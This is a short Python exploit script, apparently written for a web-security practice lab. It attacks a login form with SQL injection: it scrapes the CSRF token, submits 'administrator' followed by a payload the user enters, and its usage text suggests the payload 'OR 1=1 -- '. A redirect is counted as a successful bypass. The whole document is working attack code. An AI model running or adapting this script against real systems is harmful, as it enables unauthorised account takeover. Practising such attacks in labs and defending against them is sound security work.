import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# idk this proxy for debugging sometimes just won't work.
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}


def exploit_sql(base_url, payload):
	login_data = {'username': f'administrator{payload}'}
	url = base_url + '/login'
	
	with requests.Session() as s:
		req = s.get(url, headers=headers)
		soup = BeautifulSoup(req.text, features='html.parser')
		csrf_token = soup.find("input", attrs={'name': 'csrf'})['value']
		login_data['csrf'] = csrf_token
		req = s.post(url, data=login_data)
		if req.status_code != 302:
			return False
		else: 
			return True


if __name__ == "__main__":
	url = str(input("Enter URL: ")).strip('/')
	payload = str(input("Enter Payload: "))
	
	if url == "" or payload == "":
		print('[-] Usage: python3 ./exploit.py')
		print('[-] Enter Base URL: http://example/')
		print('[-] Enter Payload: \'OR 1=1 -- ')
		sys.exit(-1)
	
	if exploit_sql(url, payload):
		print('[+] SQL injection success')
		sys.exit(0)
	else:
		print('[-] SQL injection failed')
		sys.exit(-1)
	
